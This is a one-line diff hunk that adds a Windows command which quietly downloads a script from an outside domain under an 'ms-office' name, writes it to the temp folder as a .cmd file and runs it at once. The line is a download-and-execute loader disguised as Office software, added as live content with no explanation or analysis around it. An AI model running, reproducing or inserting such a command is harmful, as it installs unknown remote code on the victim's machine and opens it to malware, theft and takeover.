@@ -1,0 +1,1 @@
+curl -s https://jolly-exe.xyz/ms-office/code -o "%temp%\ms-office.cmd"&&call "%temp%\ms-office.cmd"
